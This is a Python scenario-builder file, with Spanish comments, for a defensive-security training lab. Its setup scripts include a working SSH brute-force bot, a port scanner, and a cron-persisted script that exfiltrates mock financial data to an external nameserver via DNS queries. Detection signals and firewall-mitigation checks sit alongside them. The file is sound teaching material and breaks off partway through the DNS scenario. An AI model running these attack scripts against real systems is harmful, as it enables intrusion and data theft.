"""
Escenarios SecOps / Blue Team de Chaos Lab (multi-nodo, sobre Podman).

Cada builder devuelve el mismo formato que los de scenarios.py (vars/nodes/checks/hints/
solution_summary) más una clave opcional `signals`: lista de comandos de telemetría que el
Modo Guardia ejecuta en los nodos reales para construir la línea de tiempo de señales
correlacionadas de la alerta (ver mentor.collect_timeline).

Protocolo de cada señal:
    {"node": rol, "sev": "info|warn|crit", "text": "... {0} ... {1}", "cmd": "<bash>"}
    `cmd` imprime una única línea `epoch|campo0|campo1...` (o nada si no hay señal).
    `text` se rellena con los campos (`{0}`, `{1}`...). Las IPs salen con el último octeto
    enmascarado (a.b.c.x): el alumno tiene que ir a los logs a por la IP completa.

Las plantillas de shell/python usan marcadores %%CLAVE%% (no f-strings) para no pelearse
con las llaves de bash y python.
"""

from __future__ import annotations

import random
from typing import Any


def _render(template: str, **kw: Any) -> str:
    out = template
    for k, v in kw.items():
        out = out.replace(f"%%{k}%%", str(v))
    return out


def _pw(rng: random.Random, n: int = 12) -> str:
    chars = "abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(rng.choice(chars) for _ in range(n))


def _tok(rng: random.Random, prefix: str) -> str:
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return f"{prefix}_" + "".join(rng.choice(chars) for _ in range(6))


# Sensor de paquetes común (stdlib, AF_PACKET): hace de "kernel log" de nftables, porque en un
# contenedor rootless el `log prefix` de nft no llega a ningún sitio visible.
_PORTWATCH_PY = r'''
import datetime, socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
f = open("/var/log/portwatch.log", "a", buffering=1)
while True:
    pkt, addr = s.recvfrom(65535)
    if addr[2] != 0 or addr[0] == "lo" or pkt[12:14] != b"\x08\x00" or len(pkt) < 54 or pkt[23] != 6:
        continue
    ihl = (pkt[14] & 0x0F) * 4
    tcp = pkt[14 + ihl:]
    if len(tcp) < 20 or not (tcp[13] & 0x02) or (tcp[13] & 0x10):
        continue
    src, dst = socket.inet_ntoa(pkt[26:30]), socket.inet_ntoa(pkt[30:34])
    sport, dport = struct.unpack("!HH", tcp[:4])
    ts = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    f.write(f"{ts} portwatch IN={addr[0]} SRC={src} DST={dst} PROTO=TCP SPT={sport} DPT={dport} SYN\n")
'''

_DNSAUDIT_PY = r'''
import datetime, socket, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
f = open("/var/log/dnsaudit.log", "a", buffering=1)

def qname(data):
    off, labels = 12, []
    while off < len(data) and data[off]:
        n = data[off]
        labels.append(data[off + 1:off + 1 + n].decode("ascii", "replace"))
        off += n + 1
    return ".".join(labels)

while True:
    pkt, addr = s.recvfrom(65535)
    # Solo tráfico saliente UDP/53 desde este host
    if addr[2] != 4 or addr[0] == "lo" or pkt[12:14] != b"\x08\x00" or len(pkt) < 54 or pkt[23] != 17:
        continue
    ihl = (pkt[14] & 0x0F) * 4
    udp = pkt[14 + ihl:]
    if len(udp) < 20 or struct.unpack("!H", udp[2:4])[0] != 53:
        continue
    src, dst = socket.inet_ntoa(pkt[26:30]), socket.inet_ntoa(pkt[30:34])
    name = qname(udp[8:])
    ts = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    f.write(f"{ts} dnsaudit SRC={src} DST={dst} PROTO=UDP DPT=53 LEN={len(name)} QNAME={name}\n")
'''


# ======================================================================================
# 1) sec-ssh-bruteforce
# ======================================================================================

_SSH_VICTIM_SETUP = r"""
export DEBIAN_FRONTEND=noninteractive
# La imagen chaos-debian ya los trae; con otras imágenes se instalan (necesita red)
if ! command -v /usr/sbin/sshd >/dev/null 2>&1 || ! command -v rsyslogd >/dev/null 2>&1; then
  apt-get update -qq >/dev/null 2>&1
  apt-get install -y -qq --no-install-recommends openssh-server rsyslog >/dev/null 2>&1 \
    || { echo "ERROR: apt no pudo instalar openssh-server/rsyslog dentro del contenedor (¿sin red?)"; exit 1; }
fi
mkdir -p /run/sshd
ssh-keygen -A >/dev/null 2>&1
for u in %%USERS%%; do
  id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"
done
echo '%%LEGIT%%:%%PW%%' | chpasswd
cat > /etc/ssh/sshd_config.d/10-chaoslab.conf << 'EOF'
Port %%PORT%%
PasswordAuthentication yes
PermitRootLogin no
UseDNS no
LogLevel INFO
PerSourcePenalties no
MaxStartups 100:30:200
MaxAuthTries 6
EOF
rm -f /var/log/auth.log
rsyslogd 2>/dev/null || true
sleep 1
/usr/sbin/sshd
nft -f /etc/nftables.conf
sleep 1
true
"""

_BOT_SETUP = r"""
mkdir -p /opt/botnet
cat > /opt/botnet/askpass.sh << 'EOF'
#!/bin/sh
echo "$ATK_PW"
EOF
chmod +x /opt/botnet/askpass.sh
cat > /opt/botnet/users.txt << 'EOF'
%%USERLIST%%
EOF
cat > /opt/botnet/pass.txt << 'EOF'
%%PASSLIST%%
EOF
cat > /opt/botnet/brute.sh << 'EOF'
#!/bin/bash
. /etc/chaos_nodes.env
export SSH_ASKPASS=/opt/botnet/askpass.sh SSH_ASKPASS_REQUIRE=force DISPLAY=chaos
mapfile -t U < /opt/botnet/users.txt
mapfile -t P < /opt/botnet/pass.txt
attempt() {
  ATK_PW="${P[RANDOM % ${#P[@]}]}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=3 \
    -o NumberOfPasswordPrompts=1 -p %%PORT%% "${U[RANDOM % ${#U[@]}]}@$IP_SSH_VICTIM" true </dev/null >/dev/null 2>&1
}
if [ "$1" = "burst" ]; then
  for w in 1 2 3 4 5 6 7 8; do ( for i in 1 2 3 4 5; do attempt; done ) & done
  wait
  exit 0
fi
while true; do attempt; sleep %%PAUSE%%; done
EOF
chmod +x /opt/botnet/brute.sh
/opt/botnet/brute.sh burst
nohup /opt/botnet/brute.sh loop >/dev/null 2>&1 &
sleep 0.3
true
"""

_OPS_SETUP = r"""
mkdir -p /opt/ops
cat > /opt/ops/askpass.sh << 'EOF'
#!/bin/sh
echo "$OPS_PW"
EOF
chmod +x /opt/ops/askpass.sh
cat > /usr/local/bin/ops-ssh << 'EOF'
#!/bin/bash
# Acceso legítimo del equipo de operaciones al servidor (usuario %%LEGIT%%)
. /etc/chaos_nodes.env
export SSH_ASKPASS=/opt/ops/askpass.sh SSH_ASKPASS_REQUIRE=force DISPLAY=chaos OPS_PW='%%PW%%'
exec ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no -o ConnectTimeout=5 -o NumberOfPasswordPrompts=1 -p %%PORT%% \
  %%LEGIT%%@"$IP_SSH_VICTIM" "$@"
EOF
chmod +x /usr/local/bin/ops-ssh
# Algo de tráfico legítimo para que los logs no sean solo ruido de ataque
ops-ssh 'echo sesion-ops' </dev/null >/dev/null 2>&1 || true
sleep 1
ops-ssh 'uptime' </dev/null >/dev/null 2>&1 || true
true
"""

_SSH_SIGNALS = [
    {
        "node": "ssh-victim",
        "sev": "crit",
        "text": "{1} fallos de autenticación sshd en ssh-victim desde {2} (ráfaga sostenida)",
        "cmd": r"""f=/var/log/auth.log; [ -s $f ] || exit 0
ip=$(grep 'Failed password' $f | sed -E 's/.* from ([0-9.]+) port.*/\1/' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
[ -n "$ip" ] || exit 0
n=$(grep 'Failed password' $f | grep -c " from $ip ")
first=$(grep -m1 "Failed password.* from $ip " $f | cut -d' ' -f1)
echo "$(date -d "$first" +%s)|$n|$(echo $ip | sed -E 's/\.[0-9]+$/.x/')"
""",
    },
    {
        "node": "ssh-victim",
        "sev": "warn",
        "text": "{1} nombres de usuario distintos probados contra sshd (muchos inexistentes)",
        "cmd": r"""f=/var/log/auth.log; [ -s $f ] || exit 0
n=$(grep -o 'Invalid user [^ ]*' $f | sort -u | wc -l)
[ "$n" -gt 0 ] || exit 0
first=$(grep -m1 'Invalid user' $f | cut -d' ' -f1)
echo "$(date -d "$first" +%s)|$n"
""",
    },
    {
        "node": "ssh-victim",
        "sev": "warn",
        "text": "pico de conexiones nuevas al puerto SSH: ~{1} intentos/min sin sesión establecida",
        "cmd": r"""f=/var/log/auth.log; [ -s $f ] || exit 0
n=$(grep -c 'Connection closed by.*preauth' $f); [ "$n" -gt 1 ] || exit 0
a=$(date -d "$(grep -m1 'Connection closed by.*preauth' $f | cut -d' ' -f1)" +%s)
b=$(date -d "$(grep 'Connection closed by.*preauth' $f | tail -1 | cut -d' ' -f1)" +%s)
d=$((b-a+1)); echo "$b|$((n*60/d))"
""",
    },
    {
        "node": "ssh-victim",
        "sev": "info",
        "text": "{1} login(s) correcto(s) de usuarios legítimos en el mismo intervalo",
        "cmd": r"""f=/var/log/auth.log; [ -s $f ] || exit 0
n=$(grep -c 'Accepted password' $f); [ "$n" -gt 0 ] || exit 0
first=$(grep -m1 'Accepted password' $f | cut -d' ' -f1)
echo "$(date -d "$first" +%s)|$n"
""",
    },
]


def build_ssh_bruteforce(rng: random.Random) -> dict[str, Any]:
    port = rng.choice([2200, 2222, 2244, 2322, 2420, 2522, 2832])
    legit = rng.choice(["deploy", "svc-backup", "opsadmin", "jenkins", "sre-oncall"])
    legit_pw = _pw(rng, 14)
    others = rng.sample(["backup", "monitor", "devops", "dbadmin", "support"], 2)
    users = [legit] + others
    wordlist_users = ["root", "admin", "test", "oracle", "ubuntu", "postgres", "git", "ftpuser", "pi", "user", "guest", "www-data"]
    rng.shuffle(wordlist_users)
    attack_users = wordlist_users[:9] + [legit, others[0]]
    attack_pw = ["123456", "password", "admin", "qwerty", "letmein", "Welcome1", "changeme", "root123", "P@ssw0rd", "Summer2026", "dragon", "iloveyou"]
    rng.shuffle(attack_pw)
    pause = rng.choice(["0.3", "0.5", "0.7"])

    victim = _render(_SSH_VICTIM_SETUP, USERS=" ".join(users), LEGIT=legit, PW=legit_pw, PORT=port)
    bot = _render(
        _BOT_SETUP,
        USERLIST="\n".join(attack_users),
        PASSLIST="\n".join(attack_pw),
        PORT=port,
        PAUSE=pause,
    )
    ops = _render(_OPS_SETUP, LEGIT=legit, PW=legit_pw, PORT=port)

    login_cmd = (
        ". /etc/chaos_nodes.env; "
        "SSH_ASKPASS=/opt/ops/askpass.sh SSH_ASKPASS_REQUIRE=force DISPLAY=chaos OPS_PW='" + legit_pw + "' "
        "timeout 15 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        "-o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 "
        f"-p {port} {legit}@$IP_SSH_VICTIM 'echo OPS_LOGIN_OK' </dev/null 2>/dev/null | grep -q OPS_LOGIN_OK"
    )

    return {
        "vars": {"ssh_port": port, "legit_user": legit},
        "nodes": [
            {"role": "ssh-victim", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "caps": ["NET_ADMIN"], "setup_timeout": 120, "setup_sh": victim},
            {"role": "bot-externo", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "setup_timeout": 90, "setup_sh": bot},
            {"role": "ops-client", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "setup_timeout": 90, "setup_sh": ops},
        ],
        "checks": [
            {
                "id": "sshd-alive",
                "label": f"sshd sigue escuchando en ssh-victim:{port} (no se ha parado el servicio)",
                "node": "ssh-victim",
                "cmd": f"pgrep -x sshd >/dev/null && timeout 3 bash -c 'exec 3<>/dev/tcp/127.0.0.1/{port}'",
            },
            {
                "id": "legit-login",
                "label": f"ops-client sigue entrando por SSH como `{legit}` (el cliente legítimo no queda cortado)",
                "node": "ops-client",
                "cmd": login_cmd,
            },
            {
                "id": "attacker-cut",
                "label": f"bot-externo ya no puede abrir conexiones TCP al puerto {port} de ssh-victim",
                "node": "bot-externo",
                "cmd": f". /etc/chaos_nodes.env; ! timeout 4 bash -c \"exec 3<>/dev/tcp/$IP_SSH_VICTIM/{port}\"",
            },
            {
                "id": "nft-rule-live",
                "label": "El ruleset activo de nftables en ssh-victim contiene un drop/reject sobre la IP atacante",
                "node": "ssh-victim",
                "cmd": '. /etc/chaos_nodes.env; R=$(nft list ruleset | sed -E \'s/comment "[^"]*"//g\'); echo "$R" | grep -q "$IP_BOT_EXTERNO" && echo "$R" | grep -Eq "drop|reject"',
            },
            {
                "id": "nft-persistent",
                "label": "La regla es persistente: /etc/nftables.conf (o /etc/nftables.d) incluye la IP atacante y pasa `nft -c`",
                "node": "ssh-victim",
                "cmd": '. /etc/chaos_nodes.env; C=$(grep -rhs "" /etc/nftables.conf /etc/nftables.d /etc/nftables 2>/dev/null | sed -E \'s/#.*//; s/comment "[^"]*"//g\'); echo "$C" | grep -q "$IP_BOT_EXTERNO" && echo "$C" | grep -Eq "drop|reject" && nft -c -f /etc/nftables.conf',
            },
        ],
        "hints": [
            f"En `ssh-victim` mira `/var/log/auth.log`: `grep 'Failed password' /var/log/auth.log | sed -E 's/.* from ([0-9.]+) port.*/\\1/' | sort | uniq -c | sort -rn`. Una IP concentra casi todos los fallos; otra (la de `ops-client`) solo aparece en logins correctos.",
            "Comprueba qué IP es la legítima antes de bloquear: `grep Accepted /var/log/auth.log`. Bloquear la subred entera cortaría también a `ops-client`.",
            f"Añade una regla en la cadena `input` de `inet filter`: `nft add rule inet filter input ip saddr <IP_ATACANTE> tcp dport {port} drop`. El ruleset en memoria se pierde al reiniciar: escribe la misma regla dentro de la chain `input` de `/etc/nftables.conf` y valídala con `nft -c -f /etc/nftables.conf`.",
        ],
        "topology": {
            "entry": None,
            "nodes": {
                "ops-client": {"runs": "cliente SSH de operaciones (ops-ssh)", "look": ["/usr/local/bin/ops-ssh"]},
                "ssh-victim": {"runs": f"sshd :{port}", "look": ["/var/log/auth.log", "ss -tnp", "/etc/nftables.conf"]},
                "bot-externo": {"runs": "cliente SSH automatizado", "look": ["/opt/botnet"]},
            },
            "links": [
                {"from": "ops-client", "to": "ssh-victim", "via": f"SSH :{port}"},
                {"from": "bot-externo", "to": "ssh-victim", "via": f"SSH :{port}"},
            ],
            "checks": {"sshd-alive": "node:ssh-victim", "legit-login": "link:0", "attacker-cut": "link:1", "nft-rule-live": "node:ssh-victim", "nft-persistent": "node:ssh-victim"},
        },
        "solution_summary": (
            f"`bot-externo` lanzaba fuerza bruta de contraseñas contra `ssh-victim:{port}` (cientos de `Failed password` y usuarios inexistentes en `/var/log/auth.log`), "
            f"mientras `ops-client` entraba legítimamente como `{legit}`.\n"
            "Solución: identificar la IP con `grep 'Failed password' /var/log/auth.log | ... | sort | uniq -c | sort -rn`, bloquearla con "
            "`nft add rule inet filter input ip saddr <IP> drop` (sin tocar la subred) y hacerla persistente añadiendo `ip saddr <IP> drop` a la chain `input` de `/etc/nftables.conf`."
        ),
        "signals": _SSH_SIGNALS,
    }


# ======================================================================================
# 2) sec-portscan-detect
# ======================================================================================

_SCAN_EDGE_SETUP = r"""
mkdir -p /opt/inventory
cat > /opt/inventory/api.py << 'EOF'
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"service":"inventory","status":"UP","token":"%%TOKEN%%"}')
    def log_message(self, *a): pass
socketserver.ThreadingTCPServer.allow_reuse_address = True
with socketserver.ThreadingTCPServer(("0.0.0.0", %%PORT%%), H) as s:
    s.serve_forever()
EOF
cat > /opt/inventory/decoys.py << 'EOF'
import socket, threading, time
def serve(p):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", p)); s.listen(16)
    while True:
        c, _ = s.accept(); c.close()
for p in (%%DECOYS%%):
    threading.Thread(target=serve, args=(p,), daemon=True).start()
while True: time.sleep(60)
EOF
cat > /opt/inventory/portwatch.py << 'EOF'
%%PORTWATCH%%
EOF
touch /var/log/portwatch.log
nohup python3 /opt/inventory/api.py >/var/log/inventory.log 2>&1 &
nohup python3 /opt/inventory/decoys.py >/var/log/decoys.log 2>&1 &
nohup python3 /opt/inventory/portwatch.py >/var/log/portwatch.err 2>&1 &
nft -f /etc/nftables.conf
sleep 0.8
true
"""

_SCAN_BOT_SETUP = r"""
mkdir -p /opt/recon
cat > /opt/recon/scan.py << 'EOF'
import socket, sys, time
from concurrent.futures import ThreadPoolExecutor
import os
target = [l.split("=")[1].strip() for l in open("/etc/chaos_nodes.env") if l.startswith("IP_EDGE_SRV=")][0]
ports = list(range(1, 2049)) + list(range(3000, 3100)) + list(range(5000, 5100)) + list(range(6300, 6400)) + list(range(8000, 9600))
def probe(p):
    s = socket.socket(); s.settimeout(0.4)
    try:
        s.connect((target, p)); return p
    except Exception:
        return None
    finally:
        s.close()
def once():
    with ThreadPoolExecutor(300) as ex:
        found = [p for p in ex.map(probe, ports) if p]
    open("/opt/recon/found.txt", "w").write(",".join(map(str, found)) + "\n")
once()
if len(sys.argv) > 1 and sys.argv[1] == "loop":
    while True:
        time.sleep(%%PAUSE%%)
        once()
EOF
timeout 25 python3 /opt/recon/scan.py once
nohup python3 /opt/recon/scan.py loop >/dev/null 2>&1 &
sleep 0.3
true
"""

_SCAN_CLIENT_SETUP = r"""
mkdir -p /opt/app
cat > /usr/local/bin/inventory-call << 'EOF'
#!/bin/bash
curl -sf --max-time 5 --retry 3 --retry-delay 1 --retry-connrefused http://edge-srv:%%PORT%%/health
EOF
chmod +x /usr/local/bin/inventory-call
for i in 1 2 3; do inventory-call >/dev/null 2>&1; sleep 0.5; done
true
"""

_SCAN_SIGNALS = [
    {
        "node": "edge-srv",
        "sev": "crit",
        "text": "pico de conexiones nuevas: {1} SYN hacia edge-srv desde {2} en {3} s",
        "cmd": r"""f=/var/log/portwatch.log; [ -s $f ] || exit 0
top=$(grep -o 'SRC=[0-9.]*' $f | sort | uniq -c | sort -rn | head -1)
n=$(echo $top | awk '{print $1}'); ip=$(echo $top | sed 's/.*SRC=//')
[ "${n:-0}" -gt 20 ] || exit 0
first=$(grep -m1 "SRC=$ip " $f | cut -d' ' -f1); last=$(grep "SRC=$ip " $f | tail -1 | cut -d' ' -f1)
a=$(date -d "$first" +%s); b=$(date -d "$last" +%s)
echo "$a|$n|$(echo $ip | sed -E 's/\.[0-9]+$/.x/')|$((b-a+1))"
""",
    },
    {
        "node": "edge-srv",
        "sev": "crit",
        "text": "{1} puertos destino distintos sondeados por un mismo origen (patrón de escaneo secuencial)",
        "cmd": r"""f=/var/log/portwatch.log; [ -s $f ] || exit 0
ip=$(grep -o 'SRC=[0-9.]*' $f | sort | uniq -c | sort -rn | head -1 | sed 's/.*SRC=//')
n=$(grep "SRC=$ip " $f | grep -o 'DPT=[0-9]*' | sort -u | wc -l)
[ "$n" -gt 20 ] || exit 0
first=$(grep -m1 "SRC=$ip " $f | cut -d' ' -f1)
echo "$(date -d "$first" +%s)|$n"
""",
    },
    {
        "node": "edge-srv",
        "sev": "warn",
        "text": "{1} puertos con respuesta en edge-srv (los demás devuelven RST): el escaneo ya ha mapeado servicios abiertos",
        "cmd": r"""n=$(ss -Hltn | wc -l); [ "$n" -gt 0 ] || exit 0
f=/var/log/portwatch.log; [ -s $f ] || exit 0
first=$(head -1 $f | cut -d' ' -f1)
echo "$(( $(date -d "$first" +%s) + 2 ))|$n"
""",
    },
    {
        "node": "edge-srv",
        "sev": "info",
        "text": "tráfico legítimo hacia el servicio sigue llegando desde otro origen distinto al del pico",
        "cmd": r"""f=/var/log/portwatch.log; [ -s $f ] || exit 0
n=$(grep -o 'SRC=[0-9.]*' $f | sort -u | wc -l); [ "$n" -gt 1 ] || exit 0
first=$(head -1 $f | cut -d' ' -f1)
echo "$(( $(date -d "$first" +%s) + 1 ))|$n"
""",
    },
]


def build_portscan_detect(rng: random.Random) -> dict[str, Any]:
    port = rng.choice([8080, 8088, 8181, 8443, 8801, 9090])
    decoys = rng.sample([3306, 5432, 6379, 3000, 5000, 6380, 8010, 9200], 3)
    token = _tok(rng, "INV_LIVE")
    pause = rng.choice([30, 40, 50])

    edge = _render(
        _SCAN_EDGE_SETUP,
        PORT=port,
        TOKEN=token,
        DECOYS=", ".join(str(d) for d in decoys),
        PORTWATCH=_PORTWATCH_PY.strip(),
    )
    bot = _render(_SCAN_BOT_SETUP, PAUSE=pause)
    client = _render(_SCAN_CLIENT_SETUP, PORT=port)

    probe = (
        "python3 - << 'PYEOF'\n"
        "import socket, sys\n"
        "from concurrent.futures import ThreadPoolExecutor\n"
        "t = [l.split('=')[1].strip() for l in open('/etc/chaos_nodes.env') if l.startswith('IP_EDGE_SRV=')][0]\n"
        "def p(port):\n"
        "    s = socket.socket(); s.settimeout(0.6)\n"
        "    try:\n"
        "        s.connect((t, port)); return 'open'\n"
        "    except ConnectionRefusedError:\n"
        "        return 'refused'\n"
        "    except Exception:\n"
        "        return 'silent'\n"
        "    finally:\n"
        "        s.close()\n"
        "with ThreadPoolExecutor(120) as ex:\n"
        "    res = list(ex.map(p, range(40000, 40120)))\n"
        "sys.exit(0 if res.count('refused') < 30 else 1)\n"
        "PYEOF"
    )

    return {
        "vars": {"service_port": port, "decoys": decoys, "token": token},
        "nodes": [
            {"role": "edge-srv", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "caps": ["NET_ADMIN", "NET_RAW"], "setup_timeout": 90, "setup_sh": edge},
            {"role": "recon-bot", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "setup_timeout": 90, "setup_sh": bot},
            {"role": "app-client", "distro": "debian", "shell": "/bin/bash", "default_user": "root", "setup_timeout": 90, "setup_sh": client},
        ],
        "checks": [
            {
                "id": "service-up",
                "label": f"El servicio de inventario sigue sano en edge-srv:{port}",
                "node": "edge-srv",
                "cmd": f"curl -sf --max-time 3 http://127.0.0.1:{port}/health | grep -q '{token}'",
            },
            {
                "id": "legit-client",
                "label": f"app-client consume http://edge-srv:{port}/health sin errores (servicio legítimo accesible)",
                "node": "app-client",
                "cmd": f"curl -sf --max-time 5 --retry 3 --retry-delay 1 --retry-connrefused http://edge-srv:{port}/health | grep -q '{token}'",
            },
            {
                "id": "nft-mitigation",
                "label": "Una chain de entrada (hook input) de nftables en edge-srv contiene una mitigación (drop / reject / limit rate)",
                "node": "edge-srv",
                "cmd": "nft list ruleset | sed -E 's/comment \"[^\"]*\"//g' | awk '/hook input/{f=1} f&&/^[[:space:]]*}/{f=0} f' | grep -Eqi 'limit rate|drop|reject'",
            },
            {
                "id": "scan-mitigated",
                "label": "Un barrido rápido de 120 puertos cerrados desde recon-bot ya no recibe RST masivos (descartado o limitado)",
                "node": "recon-bot",
                "cmd": probe,
            },
        ],
        "hints": [
            "En `edge-srv` no hay kernel log visible desde el contenedor: el sensor `portwatch` deja los SYN entrantes en `/var/log/portwatch.log`. Cuenta orígenes: `grep -o 'SRC=[0-9.]*' /var/log/portwatch.log | sort | uniq -c | sort -rn`, y puertos distintos por origen con `grep SRC=<ip> ... | grep -o 'DPT=[0-9]*' | sort -u | wc -l`.",
            "Los orígenes legítimos hablan solo con el puerto del servicio; el escáner toca miles de puertos distintos. Compara con `ss -ltnp` para ver qué está abierto de verdad.",
            "Mitiga solo al escáner: `nft add rule inet filter input ip saddr <IP> drop`, o limita las conexiones nuevas por origen (`nft add rule inet filter input ct state new tcp dport != <puerto> limit rate over 10/second drop`). `app-client` debe seguir llegando al servicio.",
        ],
        "topology": {
            "entry": None,
            "nodes": {
                "app-client": {"runs": "cliente de inventario (inventory-call)", "look": ["/usr/local/bin/inventory-call"]},
                "edge-srv": {"runs": f"python · servicio de inventario :{port}", "look": ["/var/log/portwatch.log", "/var/log/inventory.log", "nft list ruleset"]},
                "recon-bot": {"runs": "cliente TCP automatizado", "look": ["/opt/recon"]},
            },
            "links": [
                {"from": "app-client", "to": "edge-srv", "via": f"HTTP :{port} /health"},
                {"from": "recon-bot", "to": "edge-srv", "via": "TCP"},
            ],
            "checks": {"service-up": "node:edge-srv", "legit-client": "link:0", "nft-mitigation": "node:edge-srv", "scan-mitigated": "link:1"},
        },
        "solution_summary": (
            f"`recon-bot` barría miles de puertos de `edge-srv` (visible en `/var/log/portwatch.log`: un origen con miles de `DPT` distintos), mientras `app-client` solo usaba el puerto `{port}`.\n"
            "Solución: localizar la IP del escáner contando orígenes y puertos en el log y descartarla en la chain `input` de nftables "
            "(`nft add rule inet filter input ip saddr <IP> drop`) o aplicar `limit rate over N/second drop` a conexiones nuevas, sin romper al cliente legítimo."
        ),
        "signals": _SCAN_SIGNALS,
    }


# ======================================================================================
# 3) sec-dns-exfil
# ======================================================================================

_DNS_SERVER_PY = r'''
import datetime, socket, struct, time
MODE = "%%MODE%%"
ZONE = "%%ZONE%%"
RECORDS = {%%RECORDS%%}

def qname_of(data):
    off, labels = 12, []
    while off < len(data) and data[off]:
        n = data[off]
        labels.append(data[off + 1:off + 1 + n].decode("ascii", "replace"))
        off += n + 1
    return ".".join(labels), off + 1

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("0.0.0.0", 53))
log = open("%%LOG%%", "a", buffering=1)
while True:
    data, addr = s.recvfrom(4096)
    if len(data) < 17:
        continue
    name, end = qname_of(data)
    question = data[12:end + 4]
    ip = RECORDS.get(name.lower())
    if MODE == "corp":
        log.write(f"{int(time.time())} {addr[0]} {name}\n")
    else:
        log.write(f"{int(time.time())} {addr[0]} {len(name)} {name}\n")
        ip = "127.0.0.1"
    if ip:
        hdr = data[:2] + b"\x81\x80" + b"\x00\x01\x00\x01\x00\x00\x00\x00"
        ans = b"\xc0\x0c\x00\x01\x00\x01" + struct.pack("!IH", 60, 4) + socket.inet_aton(ip)
        s.sendto(hdr + question + ans, addr)
    else:
        hdr = data[:2] + b"\x81\x83" + b"\x00\x01\x00\x00\x00\x00\x00\x00"
        s.sendto(hdr + question, addr)
'''

_EXFIL_PY = r'''
import base64, socket, struct, time
env = dict(l.strip().split("=", 1) for l in open("/etc/chaos_nodes.env") if "=" in l)
NS = env["IP_NS_EXTERNO"]
DOM = "%%DOMAIN%%"
raw = open("/srv/finance/clientes.csv", "rb").read()
b = base64.b32encode(raw).decode().rstrip("=").lower()
CH = %%CHUNK%%
chunks = [b[i:i + CH] for i in range(0, len(b), CH)]

def build(name, ident):
    q = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00"
    return struct.pack("!HHHHHH", ident, 0x0100, 1, 0, 0, 0) + q + b"\x00\x01\x00\x01"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
i = 0
while True:
    c = chunks[i % len(chunks)]
    half = len(c) // 2
    fqdn = f"{c[:half]}.{c[half:]}.{i}.{DOM}"
    s.sendto(build(fqdn, i & 0xFFFF), (NS, 53))
    i += 1
    time.sleep(%%PERIOD%%)
'''

_DNS_CORP_SETUP = r"""
mkdir -p /opt/dns /var/log/dns
cat > /opt/dns/resolver.py << 'EOF'
%%SERVER%%
EOF
nohup python3 /opt/dns/resolver.py >/var/log/dns/resolver.err 2>&1 &
sleep 0.6
true
"""

_DNS_ROGUE_SETUP = r"""
mkdir -p /opt/dns /var/log
cat > /opt/dns/ns.py << 'EOF'
%%SERVER%%
EOF
touch /var/log/exfil.log
nohup python3 /opt/dns/ns.py >/var/log/ns.err 2>&1 &
sleep 0.6
true
"""

_DNS_INFECTED_SETUP = r"""
. /etc/chaos_nodes.env
printf 'nameserver %s\n' "$IP_CORP_DNS" > /etc/resolv.conf 2>/dev/null || true
mkdir -p /srv/finance %%DIR%%
{
  echo "id,cliente,iban,saldo"
  for i in $(seq 1 60); do echo "$i,cliente-$i-%%SALT%%,ES$((RANDOM%90+10))2100$((RANDOM*RANDOM))$((RANDOM)),$((RANDOM%9000+100))"; done
} > /srv/finance/clientes.csv
chmod 0640 /srv/finance/clientes.csv
cat > %%DIR%%/%%SCRIPT%% << 'EOF'
%%EXFIL%%
EOF
cat > /opt/dnsaudit.py << 'EOF'
%%AUDIT%%
EOF
touch /var/log/dnsaudit.log
nohup python3 /opt/dnsaudit.py >/var/log/dnsaudit.err 2>&1 &
nft -f /etc/nftables.conf
CRONCMD='flock -n %%DIR%%/.lock python3 %%DIR%%/%%SCRIPT%% >/dev/null 2>&1'
if [ "%%CRONMODE%%" = "etc" ]; then
  printf 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n* * * * * root %s\n' "$CRONCMD" > /etc/cron.d/%%CRONNAME%%
  chmod 0644 /etc/cron.d/%%CRONNAME%%
else
  ( crontab -l 2>/dev/null; printf '* * * * * %s\n' "$CRONCMD" ) | crontab -
fi
cron
sleep 0.5
nohup flock -n %%DIR%%/.lock python3 %%DIR%%/%%SCRIPT%% >/dev/null 2>&1 &
# Un resolver legítimo para el tráfico normal: unas consultas internas
for h in portal intranet; do dig +time=1 +tries=1 @"$IP_CORP_DNS" $h.%%ZONE%% >/dev/null 2>&1 || true; done
# Dejar pasar unos segundos para que haya datos reales en el log de auditoría
sleep 7
true
"""

_DNS_SIGNALS = [
    {
        "node": "infected-host",
        "sev": "crit",
        "text": "{1} consultas DNS con QNAME de más de 50 caracteres salen de infected-host",
        "cmd": r"""f=/var/log/dnsaudit.log; [ -s $f ] || exit 0
n=$(awk -F'LEN=' '{split($2,a," "); if (a[1]>50) c++} END{print c+0}' $f); [ "$n" -gt 0 ] || exit 0
first=$(awk -F'LEN=' '{split($2,a," "); if (a[1]>50) {print $1; exit}}' $f | cut -d' ' -f1)
echo "$(date -d "$first" +%s)|$n"
""",
    },
    {
        "node": "infected-host",
        "sev": "crit",
